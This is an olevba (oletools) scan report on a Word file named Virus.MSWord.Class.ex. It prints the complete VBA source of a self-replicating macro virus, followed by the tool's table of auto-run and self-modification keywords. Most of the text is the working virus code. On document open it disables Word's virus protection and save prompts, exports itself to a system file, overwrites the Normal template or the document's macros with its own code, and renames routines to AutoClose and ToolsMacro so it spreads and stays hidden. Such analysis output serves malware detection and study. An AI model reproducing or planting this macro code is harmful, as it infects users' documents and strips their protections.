olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ex
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ex - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'$$0000005
Const SluzhFile = "c:\windows\class.sys"
Sub AutoOpen()
    On Error GoTo out
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    ad = Val(Right(Trim(ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1)), 7))
    nt = Val(Right(Trim(NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1)), 7))
    If nt = 0 Or nt < ad Then
        Set Host = NormalTemplate.VBProject.VBComponents.Item(1)
        ActiveDocument.VBProject.VBComponents.Item(1).export SluzhFile
    Else
        If ad = 0 Or ad < nt Then Set Host = ActiveDocument.VBProject.VBComponents.Item(1) Else GoTo out
    End If
    While Host.codemodule.CountOfLines > 0
       Host.codemodule.deletelines 1
    Wend
    Host.codemodule.AddFromFile (SluzhFile)
    For x = 1 To 4
        Host.codemodule.deletelines 1
    Next x
    If nt = 0 Or nt < ad Then
        Host.codemodule.replaceline 3, "Sub AutoClose()"
        Host.codemodule.replaceline 29, "Sub ToolsMacro()"
    End If
out:
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

